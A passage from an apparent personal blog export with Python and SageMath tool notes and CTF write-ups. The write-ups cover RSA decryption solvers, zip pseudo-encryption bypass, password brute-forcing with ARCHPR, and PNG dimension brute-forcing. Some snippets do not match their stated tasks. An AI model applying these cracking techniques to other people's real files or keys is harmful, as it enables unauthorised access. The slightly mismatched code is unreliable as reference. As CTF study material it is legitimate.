<p>output: the roots</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># if the output is sat that stands for there exist roots</span></span><br><span class="line">s.model()</span><br><span class="line"><span class="comment"># [a = 8, b = 2]</span></span><br></pre></td></tr></table></figure>



<h2 id="itertools"><a href="#itertools" class="headerlink" title="itertools"></a>itertools</h2><blockquote>
<p>Traverse all possibilities</p>
</blockquote>
<blockquote>
<p><a href="https://docs.python.org/3/library/itertools.html">itertools â€” Functions creating iterators for efficient looping â€” Python 3.11.1 documentation</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br></pre></td></tr></table></figure>



<h3 id="product"><a href="#product" class="headerlink" title="product()"></a>product()</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">product(<span class="string">&#x27;ABCD&#x27;</span>, repeat = <span class="number">2</span>)</span><br><span class="line"><span class="comment"># AA AB AC AD BA BB BC BD CA CB CC CD DA DB DC DD</span></span><br></pre></td></tr></table></figure>



<h3 id="permutations"><a href="#permutations" class="headerlink" title="permutations()"></a>permutations()</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">permutations(<span class="string">&#x27;ABCD&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># AB AC AD BA BC BD CA CB CD DA DB DC</span></span><br><span class="line"><span class="comment"># no repeated compared to result above</span></span><br></pre></td></tr></table></figure>



<h3 id="combinations"><a href="#combinations" class="headerlink" title="combinations()"></a>combinations()</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combinations(<span class="string">&#x27;ABCD&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># AB AC AD BC BD CD</span></span><br></pre></td></tr></table></figure>



<h3 id="combinations-with-replacement"><a href="#combinations-with-replacement" class="headerlink" title="combinations_with_replacement()"></a>combinations_with_replacement()</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combinations_with_replacement(<span class="string">&#x27;ABCD&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># AA AB AC AD BB BC BD CC CD DD</span></span><br><span class="line"><span class="comment"># repeated compared to result above</span></span><br></pre></td></tr></table></figure>



<h2 id="libnum"><a href="#libnum" class="headerlink" title="libnum"></a>libnum</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br></pre></td></tr></table></figure>



<h3 id="n2s-n"><a href="#n2s-n" class="headerlink" title="n2s(n)"></a>n2s(n)</h3><blockquote>
<p>number convert to string</p>
</blockquote>
<h3 id="s2n-s"><a href="#s2n-s" class="headerlink" title="s2n(s)"></a>s2n(s)</h3><blockquote>
<p>string convert to number</p>
</blockquote>
<h3 id="s2b-s"><a href="#s2b-s" class="headerlink" title="s2b(s)"></a>s2b(s)</h3><blockquote>
<p>string convert to binary</p>
</blockquote>
<h3 id="b2s-b"><a href="#b2s-b" class="headerlink" title="b2s(b)"></a>b2s(b)</h3><blockquote>
<p>binary convert to string</p>
</blockquote>
<h3 id="prime-n"><a href="#prime-n" class="headerlink" title="prime(n)"></a>prime(n)</h3><blockquote>
<p>produce primes &lt; &#x3D; n</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>primes(<span class="number">14</span>)</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>primes(<span class="number">13</span>)</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>]</span><br></pre></td></tr></table></figure>



<h3 id="generate-prime-n"><a href="#generate-prime-n" class="headerlink" title="generate_prime(n)"></a>generate_prime(n)</h3><blockquote>
<p>generate bit_length&#x3D;n prime</p>
</blockquote>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">generate_prime(<span class="number">10</span>)</span><br><span class="line"><span class="comment"># 787</span></span><br></pre></td></tr></table></figure>



<h1 id="sagemath"><a href="#sagemath" class="headerlink" title="sagemath"></a>sagemath</h1><blockquote>
<p><a href="https://doc.sagemath.org/html/en/reference/">Reference Manual (sagemath.org)</a></p>
</blockquote>
<h2 id="var"><a href="#var" class="headerlink" title="var()"></a>var()</h2><blockquote>
<p>input: Integer</p>
<p>output:  Integer variables</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x, y, z = var(<span class="string">&#x27;x y z&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="solve-1"><a href="#solve-1" class="headerlink" title="solve()"></a>solve()</h2><blockquote>
<p>input: solve([equations], [variables])</p>
<p>output: roots</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">3x-y+z=185</span></span><br><span class="line"><span class="string">2x+3y-z=321</span></span><br><span class="line"><span class="string">x+y+z=173</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">x, y, z = var(<span class="string">&#x27;x y z&#x27;</span>)</span><br><span class="line">f1 = <span class="number">3</span>*x - y + z == <span class="number">185</span></span><br><span class="line">f2 = <span class="number">2</span>*x + <span class="number">3</span>*y - z == <span class="number">321</span></span><br><span class="line">f3 = x + y + z == <span class="number">185</span></span><br><span class="line">sol = solve([f1, f2, f3], [x, y, z])</span><br><span class="line"><span class="comment"># [[x == 74, y == 68, z == 31]]</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">x*x+x-7943722218936282=0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">f = x*x + x - <span class="number">7943722218936282</span></span><br><span class="line">solve([f], [x])</span><br><span class="line"><span class="comment"># [x == 89127561, x == -89127562]</span></span><br></pre></td></tr></table></figure>



<h2 id="Q-coefficients"><a href="#Q-coefficients" class="headerlink" title="Q.coefficients()"></a>Q.coefficients()</h2><blockquote>
<p>The coefficients in the polynomial Q are extracted and sorted in ascending order.</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sage: x = var(&#x27;x&#x27;)</span><br><span class="line">sage: f = x^4 + 333*x^2 + 1234*x - 294832</span><br><span class="line">sage: f.coefficients()</span><br><span class="line">[[-294832, 0], [1234, 1], [333, 2], [1, 4]]</span><br><span class="line">sage: f.coefficients()[0]</span><br><span class="line">[-294832, 0]</span><br><span class="line">sage: f.coefficients()[0][0]</span><br><span class="line">-294832</span><br></pre></td></tr></table></figure>



<h2 id="g-monic"><a href="#g-monic" class="headerlink" title="g.monic()"></a>g.monic()</h2><blockquote>
<p>In algebra, the first coefficient of a polynomial is often called the leading coefficient of the polynomial, and turning a polynomial into a form with a first coefficient of 1 is called a monic form. </p>
</blockquote>
<h2 id="PolynomialRing"><a href="#PolynomialRing" class="headerlink" title="PolynomialRing?"></a>PolynomialRing?</h2><h2 id="Ideal"><a href="#Ideal" class="headerlink" title="Ideal?"></a>Ideal?</h2>]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>function</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-16-YD</title>
    <url>/2022/11/16/22-11-16-YD/</url>
    <content><![CDATA[<p>1115-YD-GAME. </p>
<p>Write Up about <strong>crypto</strong> and <strong>misc</strong>. </p>
<p>AK the crypto~ </p>
<span id="more"></span><!--toc-->

<h1 id="rrrrsa"><a href="#rrrrsa" class="headerlink" title="rrrrsa"></a>rrrrsa</h1><ul>
<li>Eulerâ€™s totient function</li>
<li>$e$ and $phi$ are not relatively-prime</li>
</ul>
<h2 id="Eulerâ€™s-totient-function"><a href="#Eulerâ€™s-totient-function" class="headerlink" title="Eulerâ€™s totient function"></a>Eulerâ€™s totient function</h2><p>Mainly use the Euler 3, which has the equation that:<br>$$<br>\varphi(p^{k}\cdot q^{r}) &#x3D; \varphi(p^{k})\cdot \varphi(q^{r})<br>$$</p>
<p>$$<br>\Longrightarrow \varphi(p) \times p^{k-1} \times \varphi(q) \times q^{r-1}<br>$$</p>
<p>$$<br>\Longrightarrow (p-1)\times p^{k-1} \times (q-1)\times q^{r-1}<br>$$</p>
<h2 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h2><p><code>task.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">256</span>)</span><br><span class="line">q=getPrime(<span class="number">256</span>)</span><br><span class="line">r=getPrime(<span class="number">256</span>)</span><br><span class="line">s=getPrime(<span class="number">256</span>)</span><br><span class="line">n=p**<span class="number">2</span>*q**<span class="number">3</span>*r**<span class="number">4</span>*s**<span class="number">5</span></span><br><span class="line">e=<span class="number">14</span></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(p,q,r,s,c,sep=<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">â€¦â€¦</span><br></pre></td></tr></table></figure>

<p><code>exp.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=<span class="number">82740843489176005842917905237448676902781319326096412115804401131397466993701</span></span><br><span class="line">q=<span class="number">85263643568597752465513069151877689268453731648228759206805083081972094635829</span></span><br><span class="line">r=<span class="number">79374890087283111247783732293463483039814224158289962524595401321277418666013</span></span><br><span class="line">s=<span class="number">102732199362754952069273055525350226201958416532282326662545431277468292741447</span></span><br><span class="line">c=<span class="number">209764158198100932214155089968863460960764115788843889450050526143389381127082813487813848764081174468416915862387829518066498286649325136938861327501126507330636283194491774843852097326223633337209701533553768182215060190222820102775941550334063704345167980872865539263669078518722589070762176421658193780663489275300987379291331254855029837613791180120722762611589441493216729829935815928668091245317003984177304991150484204972754604505926951762889894890977781284204135659968910559636276248002638001257927724627172934291321960032984200304503486457400466222152687435733385861015747679424548570249193669289227091923991244140876236848584520997920469772887694030202115298206597699720631193271607873611648764756487112169968220121850963271008810056644983219771177431102811348959976986368053544506721049809904407594329574573889027703243130484608315308768672733480521699846869769824733283356920305979098527936478174996930553057717113709689343835430493021845720498504798696915665856537146177480318328251379204246844497037689723120344053581795715706628542369652261282102647414868089</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = p**<span class="number">2</span>*q**<span class="number">3</span>*r**<span class="number">4</span>*s**<span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line">N = (p-<span class="number">1</span>)*p**(<span class="number">2</span>-<span class="number">1</span>) * (q-<span class="number">1</span>)*q**(<span class="number">3</span>-<span class="number">1</span>) * (r-<span class="number">1</span>)*r**(<span class="number">4</span>-<span class="number">1</span>) * (s-<span class="number">1</span>)*s**(<span class="number">5</span>-<span class="number">1</span>) <span class="comment"># key 1</span></span><br><span class="line">e = <span class="number">14</span></span><br><span class="line">d = invert(e//<span class="number">2</span>, N) <span class="comment"># key2-1</span></span><br><span class="line">m = iroot(powmod(c, d, n), <span class="number">2</span>)[<span class="number">0</span>] <span class="comment"># key2-2</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># 46327402297749589082353363703523801418931778189802600046922737992686461676413</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;YqcbT7kcyeciLpEE3YQuRsLzJk&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h1 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h1><blockquote>
<p>Reference: [CryptoCTF2022]PolyRSA</p>
</blockquote>
<ul>
<li>Polynomial solving</li>
</ul>
<p><code>task.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genprime</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		r = getRandomNBitInteger(<span class="number">64</span>)</span><br><span class="line">		p = r**<span class="number">6</span> + <span class="number">8</span>*r**<span class="number">4</span> - <span class="number">41</span>*r**<span class="number">3</span> + <span class="number">14</span>*r**<span class="number">2</span> - <span class="number">116</span>*r + <span class="number">31387</span></span><br><span class="line">		q = r**<span class="number">5</span> - <span class="number">9</span>*r**<span class="number">4</span> + <span class="number">17</span>*r**<span class="number">3</span> - <span class="number">311</span>*r**<span class="number">2</span> - <span class="number">16</span>*r + <span class="number">14029</span></span><br><span class="line">		<span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q):</span><br><span class="line">			<span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">flag, n</span>):</span><br><span class="line">	m = bytes_to_long(flag)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">pow</span>(m, <span class="number">31337</span>, n)</span><br><span class="line"></span><br><span class="line">p, q = genprime()</span><br><span class="line">n = p * q</span><br><span class="line">c = enc(flag, n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>



<p><code>exp.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">73553176031506251642448229714220151174734540964434813056145000616720019024269982417494553771890010861489245572362590935764438928110836109730139595790550323300572059713433794357690270439325805603980903813396260703</span></span><br><span class="line">c = <span class="number">19209686331218755173713714974036153099675780768506975193406617712945126866438211292560144823093347834048813455853960982766572556698881387553177980003129346158494272297017876567974550982519632403844694686184532804</span></span><br><span class="line">e = <span class="number">31337</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Original_RSA</span>(<span class="params">p,q,e,c,n</span>):</span><br><span class="line">    N = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d = <span class="built_in">int</span>(invert(e, N))</span><br><span class="line">    m = powmod(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line">r = Symbol(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">p = <span class="keyword">lambda</span> r: r ** <span class="number">6</span> + <span class="number">8</span> * r ** <span class="number">4</span> - <span class="number">41</span> * r ** <span class="number">3</span> + <span class="number">14</span> * r ** <span class="number">2</span> - <span class="number">116</span> * r + <span class="number">31387</span></span><br><span class="line">q = <span class="keyword">lambda</span> r: r ** <span class="number">5</span> - <span class="number">9</span> * r ** <span class="number">4</span> + <span class="number">17</span> * r ** <span class="number">3</span> - <span class="number">311</span> * r ** <span class="number">2</span> - <span class="number">16</span> * r + <span class="number">14029</span></span><br><span class="line">n0 = p(r) * q(r)</span><br><span class="line">f = n - n0</span><br><span class="line"><span class="comment"># print(f)</span></span><br><span class="line">sol = solve([f], [r])</span><br><span class="line">x = sol[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">p = mpz(p(x))</span><br><span class="line">q = mpz(q(x))</span><br><span class="line">m = Original_RSA(p, q, e, c, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="comment"># 642921858775320553662877496454459277194994123046130653667709</span></span><br><span class="line"><span class="comment"># flag&#123;G3t_m0re_fuN_RSA!!!&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># or sage to solve out p, q</span></span><br><span class="line">PR.&lt;k&gt; = PolynomialRing(ZZ) <span class="comment"># define k</span></span><br><span class="line">p = k**<span class="number">6</span> + <span class="number">7</span>*k**<span class="number">4</span> - <span class="number">40</span>*k**<span class="number">3</span> + <span class="number">12</span>*k**<span class="number">2</span> - <span class="number">114</span>*k + <span class="number">31377</span></span><br><span class="line">q = k**<span class="number">5</span> - <span class="number">8</span>*k**<span class="number">4</span> + <span class="number">19</span>*k**<span class="number">3</span> - <span class="number">313</span>*k**<span class="number">2</span> - <span class="number">14</span>*k + <span class="number">14011</span></span><br><span class="line">n0 = p*q</span><br><span class="line"><span class="comment"># k^11 - 8*k^10 + 26*k^9 - 409*k^8 + 451*k^7 + 10850*k^6 + 44939*k^5 - 158301*k^4 + 71237*k^3 - 9651273*k^2 - 2036532*k + 439623147</span></span><br><span class="line">f = n - n0</span><br><span class="line">sol = f.roots() <span class="comment"># solve the root of the equation</span></span><br><span class="line"><span class="comment"># print(sol)</span></span><br><span class="line"><span class="comment"># [(9291098683758154336, 1)]</span></span><br><span class="line">x = sol[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">p = p(x)</span><br><span class="line">q = q(x)</span><br></pre></td></tr></table></figure>



<h1 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a>ezmisc</h1><blockquote>
<p>Download: <a href="ezmisc1.zip">ezmisc</a></p>
</blockquote>
<ul>
<li>Archive pseudo-encryption</li>
<li>Repair the file header</li>
<li>Extract the hidden files</li>
<li>Unzip nested packages</li>
<li>Properties area steganation &amp;&amp; Brute force</li>
<li>Blast file height or width</li>
</ul>
<h2 id="Archive-pseudo-encryption"><a href="#Archive-pseudo-encryption" class="headerlink" title="Archive pseudo-encryption"></a>Archive pseudo-encryption</h2><blockquote>
<p>Winhex</p>
</blockquote>
<p>Use winhex to find <code>504B0102</code>, and the keypoint <code>09</code> which is the 5th behind the <code>504B0102</code>. Edit it to <code>00</code> and unzip the zip. </p>
<img src="/2022/11/16/22-11-16-YD/1.jpg" class="" title="Edit and unzip">

<p> And get the output <code>1.png</code>.</p>
<h2 id="Repair-the-file-header"><a href="#Repair-the-file-header" class="headerlink" title="Repair the file header"></a>Repair the file header</h2><blockquote>
<p>Winhex</p>
</blockquote>
<p>Find the <code>1.png</code> cannot open well. Check the file header, we find that the header is <code>000000000D0A1A0A</code> which is different to <code>89504E470D0A1A0A</code>. Thus, use winhex to edit and get the real <code>1.png</code>.</p>
<img src="/2022/11/16/22-11-16-YD/1.png" class="" title="1.png">

<h2 id="Extract-the-hidden-files"><a href="#Extract-the-hidden-files" class="headerlink" title="Extract the hidden files"></a>Extract the hidden files</h2><blockquote>
<p>binwalk</p>
<p>foremost</p>
</blockquote>
<p>Use binwalk to check if there are hidden files in the picture. If yes, and we execute the foremost to get the hidden files. </p>
<p><em>Make the <strong>output</strong> file empty!</em></p>
<h2 id="Unzip-nested-packages"><a href="#Unzip-nested-packages" class="headerlink" title="Unzip nested packages"></a>Unzip nested packages</h2><blockquote>
<p>ExtractNow</p>
<p>Download: <a href="ExtractNow_V4.8.3.0.zip">ExtractNow</a></p>
</blockquote>
<p>After using the tool <code>ExtractNow</code>, we get the <code>flag.zip</code> and <code>password.zip</code> both of which are encrypted.</p>
<h2 id="Properties-area-steganation-amp-amp-Brute-force"><a href="#Properties-area-steganation-amp-amp-Brute-force" class="headerlink" title="Properties area steganation &amp;&amp; Brute force"></a>Properties area steganation &amp;&amp; Brute force</h2><blockquote>
<p>ARCHPR</p>
</blockquote>
<p>From the <code>password.zip</code> â€˜s properties, we get the hint that <code>8 digits</code>. We brute the zipâ€™s password by ARCHPR. </p>
<p>Unzip the <code>password.zip</code>, we get the <code>password.txt</code>. By this dictionary, we can also brute the <code>flag.zip</code> by ARCHPR and obtain the final picture <code>flag.png</code>.</p>
<h2 id="Blast-file-height-or-width"><a href="#Blast-file-height-or-width" class="headerlink" title="Blast file height or width"></a>Blast file height or width</h2><blockquote>
<p>stegsolve</p>
<p>python</p>
<p>winhex</p>
</blockquote>
<p>By the <code>stegsolve</code>, we can make a conclusion that the pictureâ€™s height or width has been edited from the <code>Calculated CRC</code>. </p>
<img src="/2022/11/16/22-11-16-YD/2.png" class="" title="stegsolve_check">

<p>Use a script for blasting, remember that the script has its rules. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hexstr2bytes</span>(<span class="params">s</span>):</span><br><span class="line">    b = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line">        temp = s[i:i+<span class="number">2</span>]</span><br><span class="line">        b += struct.pack(<span class="string">&#x27;B&#x27;</span>, <span class="built_in">int</span>(temp, <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">str1 = <span class="string">&#x27;49484452&#x27;</span>   <span class="comment"># HEX/IHDR</span></span><br><span class="line">str2 = <span class="string">&#x27;0802000000&#x27;</span> <span class="comment"># Bit depthï¼ŒColorTypeï¼ŒCompression methodï¼ŒFilter methodï¼ŒInterlace method</span></span><br><span class="line">bytes1 = hexstr2bytes(str1)</span><br><span class="line">bytes2 = hexstr2bytes(str2)</span><br><span class="line">wid, hei = <span class="number">507</span>, <span class="number">507</span>  <span class="comment"># width height</span></span><br><span class="line"></span><br><span class="line">crc32 = <span class="string">&#x27;0xe440b49a&#x27;</span> <span class="comment"># CRC32</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(wid, wid+<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(hei, hei+<span class="number">2000</span>):</span><br><span class="line">        width = <span class="built_in">hex</span>(w)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        height = <span class="built_in">hex</span>(h)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        bytes_tmp = hexstr2bytes(width+height)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="built_in">hex</span>(zlib.crc32(bytes1+bytes_tmp+bytes2))) == <span class="built_in">eval</span>(crc32):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(w), <span class="built_in">hex</span>(h))</span><br><span class="line">            </span><br><span class="line"><span class="comment"># 0x260 0x1fb</span></span><br></pre></td></tr></table></figure>

<p>Edit the width, and we will get the true <code>flag.png</code>.</p>
<img src="/2022/11/16/22-11-16-YD/flag.png" class="" title="true_flag">

]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>euler</tag>
        <tag>polynomial</tag>
        <tag>file</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-14-Docker-Record</title>
    <url>/2022/12/14/22-12-14-docker-record/</url>
    <content><![CDATA[<p>I want to learn the docker to compile my environment. But this week   I have no time to make full studying. </p>
<p>Thus, I make a record which made by <code>Dalao-Zimablue</code>  in this post. </p>
<span id="more"></span><!--toc-->

<p><a href="https://www.zimablue.life/2022/02/10/Docker%E5%AD%A6%E4%B9%A0/#more">https://www.zimablue.life/2022/02/10/Docker%E5%AD%A6%E4%B9%A0/#more</a></p>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-07-2022CnHoneKe</title>
    <url>/2022/12/07/22-12-07-2022CnHoneKe/</url>
    <content><![CDATA[<p>The competition was held in August. </p>
<p>The exercises except <code>factor2</code> are done. And the article is mainly aim to make a record for myself. The <code>Modus</code> is about the multiplicative homomorphic system, which is similar to the <code>Extended Euclidean algorithm</code>. </p>
<p><strong>List</strong></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> Modus</li>
<li><input checked="" disabled="" type="checkbox"> rsa</li>
<li><input disabled="" type="checkbox"> factor2</li>
<li><input checked="" disabled="" type="checkbox"> secret_data</li>
</ul>
<p>Wish I can solve out above. </p>
<span id="more"></span><!--toc-->

<h1 id="Modus"><a href="#Modus" class="headerlink" title="Modus"></a>Modus</h1><ul>
<li>multiplicative_homomorphic</li>
</ul>
<p><strong>output.txt</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">14142010206099386143235977555692857399310494373372334255226213043954222671886219214790080363755519983589419573494262932031062165425660149023699589427423291076757673539031113758789961660789969074666728548356143546954548237178966812807683542026090314756465049840269239582841323515153189937744280883895942616355068450477244038093783025761830910527817275117470273068582606801561816182028771714266926279491448124072638544823523354972471012076902504991756879694948477398253632905720027515230565063830199860044535605314432273647912553716877788661706091962626029470938285869557993283863813783012548154763397158585969860496209</span></span><br><span class="line">e1 = <span class="number">8044170206501208651566242545498471362911890649958881015968520025930186294576023443506808099677296038797758573489705294289102108150592764180571398770862282775413964383616485564171756065468610971753771700993772575426420613330938626182989999507422559869431997096499661057456703567386749182728255894961711</span></span><br><span class="line">c1 = <span class="number">11517322714245526592044873592382373283428914348422645739336159016405003731268657488015847458779166523731678788259036486197351408324218938844963108776390284845014868126098529982171539875948326597563481747612010865265679909207769244324752454968172401384300433252342047155447253514663020084257315172025978213587941036806257025876560069777775117798912056950800470305039358493009376541529192357082470617915062674822440632959240104574498373020678875137349967659371746447815516349204225897744273956308472359601558104152900628002351072193856499370256139818744736463310402972428459727204523498170929275318085749369313370330104</span></span><br><span class="line">e2 = <span class="number">7981110843177277522743262582712207767500318326009118362192817529414323700650435360291001887232564132664914694220334201133850645107707193720930288877874115700468049318771691746592219604611120450612600603061311788240065247605723819417162805390035814213048743243801428908542140081097421519822132590047533</span></span><br><span class="line">c2 = <span class="number">12907231513900923422005862146378905589636791955213455533815625546155661275692081099543894853443339737652933422555561840945917851059973294781475696342510739464313686827430856742266071924616860913810640580296234473777303348248031669837803543965896443694327322478656672147536068477193332582821244877632320706358476947499828283809012293724747791713411303065091158644428874828519807586496004634361827049528190857803358038226873772036022804215684911051370929474550764142943510840488678370689581686370179457811111602201500802245275266633124851078915997894235280935026230159846619929979668248511374747926732890795947582868735</span></span><br><span class="line">e3 = <span class="number">8321945773137532897701269832287423438330975369722946793416731752574708023263908693097168458920645511451157398450278461406044452962800707032660103849647429968263806321843635237930345258217128805872313308435747131438472827261934005675575066641207582827978944766548998867180054428477087525524476746729443</span></span><br><span class="line">c3 = <span class="number">14065425026445215199826296511184881258323064633386950509660192854866326626040354040592178906620984652169865998063876885421774133239148395916412178848784041317916589243316140373118461629430419305769180856968279675982734449182890302977853892881391084830333333875116598959777525928574769839174695101654696531535920235825780434207646161363349309470260223615977113109458426965856166705879375711518022880712089324008258280991081209228374850515248942548172463741894540420262751207821783524890116559086561517224038086473047623408064157594299815732082781632190258405091440187576055868450259807171733509904666142689629066721239</span></span><br></pre></td></tr></table></figure>



<p><strong>Analyse</strong></p>
<p>When I see the <code>output.txt</code>, the first thing appeared in my mind is the <code>SameModAttack</code>, using the <code>Extended-Extended Euclidean algorithm</code>. :) </p>
<p>Obviously it is wrong, and the correct solution is to use the <code>multiplicative homomorphic properties</code>. </p>
<p>From the <code>output</code>, we can get a condition that <code>gcd(e1, e2, e3) = 1</code>. Using the <code>Extended Euclidean algorithm</code> we can get $gcdext(a, b) \Longrightarrow gcd(a, b) &#x3D; r * a + s * b$. </p>
<p>By deduction, we will get the relation that:<br>$$<br>gcd(e1, e2) \equiv e1 * r1 + e2 * s1<br>$$</p>
<p>$$<br>gcd(gcd(e1, e2), e3) \equiv gcd(e1, e2) * r2 + e3 * s2<br>$$</p>
<p>$$<br>\Longrightarrow 1 \equiv (e1 * r1 + e2 * s1) * r2 + e3 * s2<br>$$</p>
<p>Using this important equation, we can deduce the plaintext:<br>$$<br>c1^{r1 \cdot r2} * c2^{r2 \cdot s1} * c3^{s3} \mod n<br>$$</p>
<p>$$<br>\Longrightarrow m^{e1\cdot r1 \cdot r2 + e2 \cdot r2 \cdot s1 + e3 \cdot s2} \equiv m \mod n<br>$$</p>
<p>And we can solve out the important <code>m</code>.</p>
<p><strong>exp.py</strong></p>
